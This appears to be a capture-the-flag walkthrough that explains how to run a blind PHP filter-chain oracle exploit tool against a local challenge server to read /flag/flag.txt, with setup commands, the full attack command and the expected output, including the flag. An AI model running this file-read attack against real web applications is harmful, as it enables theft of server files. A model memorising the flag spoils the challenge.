# How to Use `php_filter_chains_oracle_exploit`

**IMPORTANT:** There are TWO tools.
1.  `php_filter_chain_generator`: Generates RCE payloads. (NOT for blind file reading).
2.  `php_filter_chains_oracle_exploit`: Run the Blind Oracle attack. **USE THIS ONE.**

## 1. Setup
```bash
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
cd php_filter_chains_oracle_exploit
pip3 install -r requirements.txt
```

## 2. Using the Tool against Localhost:9051

The command to read `/flag/flag.txt` from your container:

```bash
python3 filters_chain_oracle_exploit.py \
    --target "http://localhost:9051/index.php" \
    --parameter "page" \
    --file "/flag/flag.txt"
```

## 3. What to Expect
1.  **Fingerprinting:** The tool might first send some probes to determine if the server is vulnerable to the oracle (checking if "Size Bomb" causes timeout).
2.  **Extraction:** It will start printing characters one by one.
    *   `[+] Found char: f`
    *   `[+] Found char: l`
    *   `...`
3.  **Completion:** `[+] File content: flag-arbyci`

## 4. Troubleshooting
*   **False Positives/Negatives:** If the tool is too slow or misses characters, you might need to adjust the timeout/delay settings in the code or arguments if available.
*   **Docker Networking:** Ensure you are running this from a machine that can reach `localhost:9051`.
